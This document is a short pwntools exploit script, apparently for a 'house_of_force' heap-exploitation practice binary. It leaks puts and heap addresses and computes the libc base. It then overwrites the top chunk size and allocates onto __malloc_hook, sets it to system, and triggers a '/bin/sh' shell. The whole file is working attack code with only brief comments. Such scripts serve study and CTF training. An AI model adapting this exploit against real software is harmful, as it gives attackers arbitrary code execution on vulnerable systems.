from pwn import *

elf = context.binary = ELF("house_of_force", checksec=True)
libc = elf.libc
context.log_level = "debug"

gs = """
continue
"""

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

io = start()
io.timeout = 1

def malloc(size, data):
        io.sendafter(b"> ", b"1")
        io.sendafter(b": ", str(size).encode())
        io.sendafter(b": ", data)

# parse the puts leak
io.recvuntil(b"puts() @ ")
puts_leak = int(io.recvline(), 16)
log.info(f"puts @ {hex(puts_leak)}")

io.recvuntil(b"heap @ ")
heap_leak = int(io.recvline(), 16)
log.info(f"heap @ {hex(heap_leak)}")

libc.address = puts_leak - libc.sym.puts
log.info(f"libc base calculated @ {hex(libc.address)}")

#   (libc.sym.__malloc_hook-0x20) to ensure the allocation stops just before the __malloc_hook
#     (heap_leak+0x20) to calculate the top chunk
#       subtracting these two values gives us the difference between the top chunk and the __malloc_hook function
distance = (libc.sym.__malloc_hook-0x20) -  (heap_leak+0x20)

# exploiting the heap overflow for code execution
malloc("24", b"A"*24 + p64(0xffffffffffffffff))  # overwriting the top chunk with a large value
malloc(distance, b"/bin/sh\0")                   # write '/bin/sh\0' into memory
malloc("24", p64(libc.sym.system))               # call system
malloc(next(libc.search(b"/bin/sh")), "")        # pass /bin/sh to system

io.interactive()
